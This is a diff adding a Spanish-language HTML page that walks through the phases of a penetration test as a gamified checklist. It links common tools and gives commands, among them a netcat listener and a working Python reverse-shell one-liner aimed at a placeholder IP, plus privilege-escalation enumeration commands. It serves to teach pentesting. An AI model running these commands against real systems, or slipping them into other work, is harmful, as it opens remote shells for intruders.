@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flujo de Pentesting Gamificado</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <h1>Flujo de Pentesting Gamificado 🎲</h1>
+        <p>Una guía interactiva a través de las fases de una prueba de penetración.</p>
+
+        <div class="phase" id="phase-1">
+            <div class="phase-header" onclick="togglePhase('phase-1')">
+                <h2>1. Reconocimiento <span class="status-icon material-icons">lock</span></h2>
+            </div>
+            <div class="phase-content">
+                <p>Recolectar información pasiva y activa sobre el objetivo. ¡La clave es la paciencia!</p>
+                
+                <h3>🛠️ Herramientas clave</h3>
+                <ul>
+                    <li><a href="https://nmap.org/" target="_blank">Nmap</a> (escaneo de puertos)</li>
+                    <li><a href="https://whois.domaintools.com/" target="_blank">Whois</a> (información de registro de dominio)</li>
+                    <li><a href="https://www.kali.org/tools/theharvester/" target="_blank">theHarvester</a> (correos, subdominios)</li>
+                    <li><a href="https://github.com/OWASP/Amass" target="_blank">OWASP Amass</a> (enumeración de subdominios)</li>
+                    <li><a href="https://www.shodan.io/" target="_blank">Shodan</a> (motor de búsqueda de dispositivos conectados a internet)</li>
+                </ul>
+
+                <h3>⚡ Comandos listos para usar</h3>
+                <pre><code>nmap -sV -sC -A &lt;IP_objetivo&gt;</code></pre>
+                <pre><code>whois &lt;dominio.com&gt;</code></pre>
+                <pre><code>theharvester -d &lt;dominio.com&gt; -l 500 -b google,linkedin</code></pre>
+                <button onclick="completePhase('phase-1')">Completar Fase 1 ✅</button>
+            </div>
+        </div>
+        
+        <div class="phase locked" id="phase-2">
+            <div class="phase-header" onclick="togglePhase('phase-2')">
+                <h2>2. Análisis y Escaneo <span class="status-icon material-icons">lock</span></h2>
+            </div>
+            <div class="phase-content">
+                <p>Analizar las vulnerabilidades identificadas. ¡No todo lo que brilla es oro!</p>
+                
+                <h3>📚 Bases de datos de vulnerabilidades</h3>
+                <ul>
+                    <li><a href="https://cve.mitre.org/cve/" target="_blank">CVE (Common Vulnerabilities and Exposures)</a></li>
+                    <li><a href="https://www.exploit-db.com/" target="_blank">Exploit-DB</a> (base de datos de exploits)</li>
+                    <li><a href="https://nvd.nist.gov/" target="_blank">NVD (National Vulnerability Database)</a></li>
+                </ul>
+
+                <h3>🛠️ Herramientas de escaneo</h3>
+                <ul>
+                    <li><a href="https://www.nessus.org/" target="_blank">Nessus</a> (escáner comercial)</li>
+                    <li><a href="https://www.openvas.org/" target="_blank">OpenVAS</a> (escáner de código abierto)</li>
+                    <li><a href="https://www.metasploit.com/" target="_blank">Metasploit Framework</a> (auxiliar en el escaneo)</li>
+                </ul>
+                <button onclick="completePhase('phase-2')">Completar Fase 2 ✅</button>
+            </div>
+        </div>
+
+        <div class="phase locked" id="phase-3">
+            <div class="phase-header" onclick="togglePhase('phase-3')">
+                <h2>3. Explotación <span class="status-icon material-icons">lock</span></h2>
+            </div>
+            <div class="phase-content">
+                <p>Llegó el momento de ejecutar el plan. ¡Aprovecha la vulnerabilidad!</p>
+
+                <h3>💡 Conceptos y ejemplos</h3>
+                <ul>
+                    <li>**Shells reversas**: <a href="http://www.revshells.com/" target="_blank">Reverse Shell Generator</a></li>
+                    <li>**Inyección SQL**: <a href="https://portswigger.net/web-security/sql-injection" target="_blank">Guía de SQLi</a></li>
+                    <li>**XSS (Cross-Site Scripting)**: <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">Guía de XSS</a></li>
+                </ul>
+
+                <h3>⚡ Comandos de shells reversas</h3>
+                <pre><code>nc -lvnp 4444</code></pre>
+                <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;IP_tuya&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+                <button onclick="completePhase('phase-3')">Completar Fase 3 ✅</button>
+            </div>
+        </div>
+
+        <div class="phase locked" id="phase-4">
+            <div class="phase-header" onclick="togglePhase('phase-4')">
+                <h2>4. Post-Explotación <span class="status-icon material-icons">lock</span></h2>
+            </div>
+            <div class="phase-content">
+                <p>Una vez dentro, el objetivo es escalar privilegios y mantener el acceso. ¡La meta es el control total!</p>
+                
+                <h3>🛡️ Escalada de privilegios</h3>
+                <ul>
+                    <li><a href="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation" target="_blank">Guía de Escalada en Linux</a></li>
+                    <li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank">Guía de Escalada en Windows</a></li>
+                </ul>
+
+                <h3>⚡ Comandos para escalada</h3>
+                <pre><code>sudo -l</code></pre>
+                <pre><code>find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+                <button onclick="completePhase('phase-4')">Completar Fase 4 ✅</button>
+            </div>
+        </div>
+        
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
